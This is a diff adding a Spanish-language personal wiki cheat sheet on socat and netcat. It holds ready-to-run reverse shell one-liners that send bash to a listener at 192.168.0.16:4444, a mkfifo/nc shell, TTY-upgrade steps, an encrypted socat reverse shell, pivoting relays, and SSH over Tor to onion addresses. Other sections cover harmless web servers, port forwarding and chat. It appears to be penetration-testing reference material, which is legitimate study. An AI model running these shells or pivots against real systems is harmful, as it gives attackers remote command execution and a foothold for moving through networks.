@@ -2,3 +2,135 @@
 [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md|reverse shell]]
 [[https://www.lawebdelprogramador.com/pdf/11497-netcat.html|pdf lawebprogramador]]
 [[https://jameshfisher.com/2018/12/31/how-to-make-a-webserver-with-netcat-nc/|servidor web con netcat]]
+[[https://www.busindre.com/start?do=search&id=comandos_openssl_utiles_para_certificados&q=socat|manuales de socat y de todo]]
+[[https://gist.github.com/lenciel/8780269|cosas que se pueden hacer con netcat en gist]]
+= Socat y netcat =
+=== shell reversa ===
+- socat
+{{{bash
+# Con la terminal interactiva
+socat file:`tty`,raw,echo=0 TCP-L:4444 # El que escucha
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.16:4444
+# Una shell reversa de toda la vida
+socat - tcp-l:4444
+socat tcp:192.168.0.16:4444 exec:/bin/bash
+}}}
+- netcat
+{{{bash
+# reversa normal
+nc -lvp 4444
+nc 192.168.0.16 4444 -e /bin/bash
+# Para conseguir shell interactiva completa iniciar con bash oh my zsh da problemas
+bash
+nc -lvp 4444
+# Cuando se conecta la reversa
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo
+fg # Le damos dos veces enter
+reset
+
+# interactiva sin autocompletado ni atajos
+rm -f /tmp/f 2> /dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.0.16 4444 >/tmp/f
+}}}
+=== Pivoting ===
+- netcat
+{{{bash
+rm -f /tmp/f 2> /dev/null; mkfifo /tmp/f; nc -lp 12345 0</tmp/f | nc 192.168.0.200 22 1>/tmp/f
+# O la manera facil pero no en openbsd
+nc -lvp 4444 -c "nc 192.168.0.200 22"
+}}}
+- socat
+{{{bash
+socat -v tcp-l:4444,reuseaddr tcp:192.168.0.200:22
+}}}
+=== Servidor web ===
+- socat
+{{{bash
+socat \
+    -v -d -d \
+    TCP-LISTEN:1234,crlf,reuseaddr,fork \
+    SYSTEM:"
+        echo HTTP/1.1 200 OK; 
+        echo Content-Type\: text/plain; 
+        echo; 
+        echo \"Server: \$SOCAT_SOCKADDR:\$SOCAT_SOCKPORT\";
+        echo \"Client: \$SOCAT_PEERADDR:\$SOCAT_PEERPORT\";
+    "
+}}}
+- netcat
+{{{bash
+while true; do (echo -e 'HTTP/1.1 200 OK\r\n'; echo -e "\n\tMy website has date function" ; echo -e "\t$(date)\n") | nc -lp 8080; done
+}}}
+=== Shell reversa cifrado ===
+- servidor
+{{{bash
+# Primero creamos el certificado
+openssl req -sha512 -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
+# Ponemos a la escucha para la reverse
+socat `tty`,raw,echo=0 openssl-listen:4444,reuseaddr,cert=cert.pem,verify=0
+}}}
+- cliente
+{{{bash
+socat openssl-connect:<ip>:4444,verify=0 exec:bash,pty,stderr,setsid
+}}}
+=== Redireccionamiento ===
+===== tor =====
+{{{bash
+# Antes que nada iniciar el servicio de tor
+# sudo systemctl start tor
+socat TCP-LISTEN:22222 SOCKS4A:localhost:direccion.onion:22,socksport=9050 &
+ssh usuario@localhost -p 22222
+# o
+ssh -o ProxyCommand="socat STDIO SOCKS4A:localhost:%h:%p,socksport=9050" pi@direccion.onion
+# Otra alternativa con nc.openbsd
+ssh -o ProxyCommand="nc.openbsd -X 5 -x 127.0.0.1:9050 %h %p" pi@direccion.onion
+# direccion
+nc -klvp 4444 0< /tmp/f | nc.openbsd -v -X5 -x localhost:9050 direccion.onion 22 1> /tmp/f
+}}}
+----
+[[https://is.gd/G8aegG|explicaciones busindre http >]]
+===== http > system =====
+{{{bash
+socat -v -v TCP-LISTEN:8080,bind=127.0.0.1,crlf,reuseaddr,fork SYSTEM:"echo -e HTTP/4.0 200;echo -e Content-Type\: text/plain;echo 'Hola Caracola'"
+# Si se escriben los comandos en un script este puede ser ejecutado de la siguiente forma.
+socat -v -v TCP-LISTEN:8080,bind=127.0.0.1,crlf,reuseaddr,fork SYSTEM:"bash $HOME/script.sh.sh"
+}}}
+===== http > http =====
+{{{bash
+socat -d -d TCP-LISTEN:8080,fork,reuseaddr TCP:www.dominio.com:80
+# Se enviará la cabecera Host: "www.ejemplo.com" y además usa localhost como ip del dominio www.ejemplo.com
+curl -vI --resolve www.ejemplo.com:8080:127.0.0.1 http://www.ejemplo.com:8080/bla/bla/page.php -H "Host: www.ejemplo.com"
+}}}
+===== http > https =====
+{{{bash
+ # El puerto 8080 escucha peticiones no cifradas y las redirecciona usando SSL/TLS al puerto 443 de www.dominio.com.
+socat -d -d TCP-LISTEN:8080,fork,reuseaddr SSL:www.dominio.com:443
+
+# Si no se requiere que socat compruebe el certificado se puede usar verfy=0
+socat -d -d TCP-LISTEN:8080,fork,reuseaddr SSL:XX.XX.XX.XX:443,verify=0
+
+# Si se prefiere que socat compruebe el campo commonname del certificado para establecer el handshake.
+socat -d -d TCP-LISTEN:8080,fork,reuseaddr SSL:XX.XX.XX.XX:443,commonname=www.dominio.com
+}}}
+=== chat ===
+- socat
+{{{bash
+socat - tcp-l:4444,reuseaddr
+socat - tcp:localhost:4444
+ 
+# Con cifrado
+openssl req -sha512 -new -x509 -days 365 -nodes -out cert.pem -keyout cert.pem
+socat - openssl-listen:4444,reuseaddr,verify=0,cert=cert.pem
+socat - openssl:localhost:4444,verify=0
+}}}
+- netcat
+{{{bash
+# Chat normal de uno a uno
+nc -lvp 4444
+nc localhost 4444
+
+# Chat solo disponible con ncat y cifrado
+nc --chat --ssl -lvp 4444
+nc --ssl localhost 4444
+}}}
